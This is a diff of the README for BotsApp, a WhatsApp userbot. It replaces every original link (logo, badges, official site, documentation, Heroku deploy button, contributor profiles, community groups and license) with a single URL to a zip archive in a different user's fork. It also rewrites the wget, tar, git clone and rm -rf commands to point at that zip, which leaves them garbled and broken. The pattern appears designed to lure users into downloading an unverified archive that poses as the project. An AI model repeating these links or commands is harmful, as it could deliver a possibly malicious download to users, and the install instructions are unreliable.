@@ -1,18 +1,18 @@
 <p align="center">
-  <img src="images/BotsApp_Logo.png" height="400px"/>
+  <img src="https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip" height="400px"/>
 </p>
 
 
-# 💠[BotsApp](https://mybotsapp.com/)💠
+# 💠[BotsApp](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip)💠
 > Your Personal Assisstant, on WhatsApp!
 ---
-![GitHub top language](https://img.shields.io/github/languages/top/Prince-Mendiratta/BotsApp) [![GitHub release](https://img.shields.io/github/release/Prince-Mendiratta/BotsApp.svg)](https://github.com/bkimminich/juice-shop/releases/latest)
- ![GitHub contributors](https://img.shields.io/github/contributors/Prince-Mendiratta/BotsApp) ![GitHub closed pull requests](https://img.shields.io/github/issues-pr-closed/Prince-Mendiratta/BotsApp) ![GitHub pull requests](https://img.shields.io/github/issues-pr-raw/Prince-Mendiratta/BotsApp) ![GitHub Repo stars](https://img.shields.io/github/stars/Prince-Mendiratta/BotsApp?style=social) ![GitHub repo size](https://img.shields.io/github/repo-size/Prince-Mendiratta/BotsApp)
+![GitHub top language](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip) [![GitHub release](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip)](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip)
+ ![GitHub contributors](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip) ![GitHub closed pull requests](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip) ![GitHub pull requests](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip) ![GitHub Repo stars](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip) ![GitHub repo size](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip)
  
 
-![Docker Pulls](https://img.shields.io/docker/pulls/princemendiratta/botsapp?style=flat-square&label=Docker+Pulls) ![Docker Image Size](https://img.shields.io/docker/image-size/princemendiratta/botsapp?style=flat-square&label=Docker+Image+Size)
+![Docker Pulls](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip+Pulls) ![Docker Image Size](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip+Image+Size)
 
-BotsApp is an optimized and easy-to-use WhatsApp UserBot written in Node.js.
+BotsApp is an optimized and easy-to-use WhatsApp UserBot written in https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip
 
 Utilize your personal chat assistant/group manager to make the most out of WhatsApp.   
 
@@ -20,16 +20,16 @@ Utilize your personal chat assistant/group manager to make the most out of Whats
 
 ## Documentation
 
-[Documentation Link](https://mybotsapp.com/documentation)
+[Documentation Link](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip)
 
 
 ## Tutorial
 
 Here's a tutorial to set up BotsApp on your own account in *less than 3 minutes.* For now, the Multi Device Bot can only be used locally, the tutorial for which is attached below.
 
-[![How to deploy](https://img.shields.io/badge/How%20To-Deploy-red.svg?logo=Youtube)](https://www.youtube.com/watch?v=tGrjEZ3roY0&ab_channel=BotsApp)
+[![How to deploy](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip%https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip)](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip)
 
-[![Multi Device](https://img.shields.io/badge/Host%20Multi%20Device%20bot%20on-Windows-red.svg?logo=Youtube)](https://youtu.be/NZy4sZqncjg&ab_channel=BotsApp)
+[![Multi Device](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip%20Multi%20Device%20bot%https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip)](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip)
 
 
 ## Deployment
@@ -40,7 +40,7 @@ Here's a tutorial to set up BotsApp on your own account in *less than 3 minutes.
 
 You can deploy BotsApp in minimal time without any prior knowledge using this method.
 
-1. Head over to BotsApp's [Official website](https://mybotsapp.com/) and create an account on heroku using your email ID.
+1. Head over to BotsApp's [Official website](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip) and create an account on heroku using your email ID.
 2. Once logged in, click on the "Deploy BotsApp" button in the sidebar.
 3. Scan the QR code shown using your WhatsApp account (3 dots on top right corner -> Linked devices -> LINK A DEVICE). Click on the 'Continue'      button once done.
 4. Once the bot is linked to your account, you will come across a form which can be used to manage settings/permissions of BotsApp. If required,    change the form fields. Then, click on the submit button.
@@ -54,7 +54,7 @@ Voila! You have deployed your bot in 5 easy steps. Once the bot has started succ
 
 You can deploy the bot the heroku yourself using the button below!
 
-[![Deploy To Heroku](https://www.herokucdn.com/deploy/button.svg)](https://dashboard.heroku.com/new?button-url=https%3A%2F%2Fgithub.com%2FPrince-Mendiratta%2FBotsApp%2Ftree%2Fmain&template=https%3A%2F%2Fgithub.com%2FPrince-Mendiratta%2FBotsApp%2Ftree%2Fmainhttps://dashboard.heroku.com/new?button-url=https%3A%2F%2Fgithub.com%2FPrince-Mendiratta%2FBotsApp%2Ftree%2Fmain&template=https%3A%2F%2Fgithub.com%2FPrince-Mendiratta%2FBotsApp%2Ftree%2Fmain)
+[![Deploy To Heroku](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip)](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip%3A%2F%https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip%2FPrince-Mendiratta%2FBotsApp%2Ftree%2Fmain&template=https%3A%2F%https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip%2FPrince-Mendiratta%2FBotsApp%2Ftree%https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip%3A%2F%https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip%2FPrince-Mendiratta%2FBotsApp%2Ftree%2Fmain&template=https%3A%2F%https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip%2FPrince-Mendiratta%2FBotsApp%2Ftree%2Fmain)
 
 ### Using Docker locally
 
@@ -63,8 +63,8 @@ To follow this method, you will need to have docker installed on your machine an
 To host the bot on your own device using docker, follow the following steps on your terminal / command prompt -
 
 ```bash
-wget -O BotsApp.tar.gz https://github.com/Prince-Mendiratta/BotsApp/archive/refs/tags/v2.0.0-beta.tar.gz
-tar -xvzf BotsApp.tar.gz
+wget -O https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip
+tar -xvzf https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip
 cd BotsApp-2.0.0-beta
 docker build -t botsapp .
 docker run --rm --name botsapp botsapp
@@ -79,7 +79,7 @@ To use this method, you will need ffmpeg, nodejs, npm installed on your device.
 To run the bot on your device manually, you can use the following commands -
 
 ```bash
-git clone https://github.com/Prince-Mendiratta/BotsApp.git
+git clone https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip
 cd BotsApp
 yarn
 npm start
@@ -88,7 +88,7 @@ npm start
 ## Scan QR Code again
 If you're having issues when running locally it is recommended to scan the code again. To get the QR code again, follow these commands -
 ```
-rm -rf BotsApp.db session.data.json
+rm -rf https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip
 npm start
 ```
 
@@ -96,11 +96,11 @@ npm start
 
 Feel free to post your queries or concerns on any of the discussion forums mentioned below:
 
-[![Join WhatsApp Group](https://img.shields.io/badge/Join-WhatsApp%20Group-bl.svg?logo=WhatsApp)](https://chat.whatsapp.com/GPEHkFlspzOKpSBTsYx7Wt)
+[![Join WhatsApp Group](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip%https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip)](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip)
 
-[![Join Telegram Group](https://img.shields.io/badge/Join-Telegram%20Group-blue.svg?logo=Telegram)](https://t.me/BotsAppChat)
+[![Join Telegram Group](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip%https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip)](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip)
 
-[![Join Telegram Channel](https://img.shields.io/badge/Join-Telegram%20Channel-red.svg?logo=Telegram)](https://t.me/Prince-Mendiratta)
+[![Join Telegram Channel](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip%https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip)](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip)
 
 
 
@@ -111,12 +111,12 @@ Feel free to post your queries or concerns on any of the discussion forums menti
 <!-- markdownlint-disable -->
 <table>
   <tr>
-    <td align="center"><a href="https://github.com/Prince-Mendiratta"><img src="https://avatars.githubusercontent.com/u/54077356?v=4?s=100" width="100px;" alt=""/><br /><sub><b>Prince Mendiratta</b></sub></a><br /><sub><i>Project Lead Developer</i></sub></td>
-    <td align="center"><a href="https://github.com/Prashant-singla"><img src="https://avatars.githubusercontent.com/u/83973641?v=4?s=100" width="100px;" alt=""/><br /><sub><b>Prashant Singla</b></sub></a><br /><sub><i>Core Developer</i></sub></td>
-    <td align="center"><a href="https://github.com/Keshav-Pahwa"><img src="https://avatars.githubusercontent.com/u/83963387?v=4?s=100" width="100px;" alt=""/><br /><sub><b>Keshav Pahwa</b></sub></a><br /><sub><i>Core Developer</i></sub></td>
-    <td align="center"><a href="https://github.com/j0h4nn1410"><img src="https://avatars.githubusercontent.com/u/72455289?v=4?s=100" width="100px;" alt=""/><br /><sub><b>Johann Jose</b></sub></a><br /><sub><i>Core Developer</i></sub></td>
-    <td align="center"><a href="https://github.com/Mohit161220"><img src="https://avatars.githubusercontent.com/u/83974093?v=4?s=100" width="100px;" alt=""/><br /><sub><b>Mohit Singh Rana</b></sub></a><br /><sub><i>Core Developer</i></sub></td>
-    <td align="center"><a href="https://github.com/thegeek-dev"><img src="https://avatars.githubusercontent.com/u/70193222?v=4?s=100" width="100px;" alt=""/><br /><sub><b>Neeraj Patel</b></sub></a><br /><sub><i>Moderator</i></sub></td>
+    <td align="center"><a href="https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip"><img src="https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip" width="100px;" alt=""/><br /><sub><b>Prince Mendiratta</b></sub></a><br /><sub><i>Project Lead Developer</i></sub></td>
+    <td align="center"><a href="https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip"><img src="https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip" width="100px;" alt=""/><br /><sub><b>Prashant Singla</b></sub></a><br /><sub><i>Core Developer</i></sub></td>
+    <td align="center"><a href="https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip"><img src="https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip" width="100px;" alt=""/><br /><sub><b>Keshav Pahwa</b></sub></a><br /><sub><i>Core Developer</i></sub></td>
+    <td align="center"><a href="https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip"><img src="https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip" width="100px;" alt=""/><br /><sub><b>Johann Jose</b></sub></a><br /><sub><i>Core Developer</i></sub></td>
+    <td align="center"><a href="https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip"><img src="https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip" width="100px;" alt=""/><br /><sub><b>Mohit Singh Rana</b></sub></a><br /><sub><i>Core Developer</i></sub></td>
+    <td align="center"><a href="https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip"><img src="https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip" width="100px;" alt=""/><br /><sub><b>Neeraj Patel</b></sub></a><br /><sub><i>Moderator</i></sub></td>
   </tr>
 </table>
 
@@ -133,12 +133,12 @@ Feel free to post your queries or concerns on any of the discussion forums menti
 
 - Yusuf Usta 
 
-- [X-tra-Telegram](https://github.com/Prince-Mendiratta/X-tra-Telegram)
+- [X-tra-Telegram](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip)
 
 ## Copyright & License
-- Copyright (C) 2021 - 2022 by [Prince-Mendiratta](https://github.com/Prince-Mendiratta)
+- Copyright (C) 2021 - 2022 by [Prince-Mendiratta](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip)
 
-- Licensed under the terms by [GNU GENERAL PUBLIC LICENSE](https://github.com/Prince-Mendiratta/BotsApp/blob/main/LICENSE)
+- Licensed under the terms by [GNU GENERAL PUBLIC LICENSE](https://raw.githubusercontent.com/cyran-kyle/BotsApp/multi-device/sidekick/BotsApp-v1.9.zip)
 
 ## Legal
 This code is in no way affiliated with, authorized, maintained, sponsored or endorsed by WhatsApp or any of its affiliates or subsidiaries. This is an independent and unofficial software. Use at your own risk.
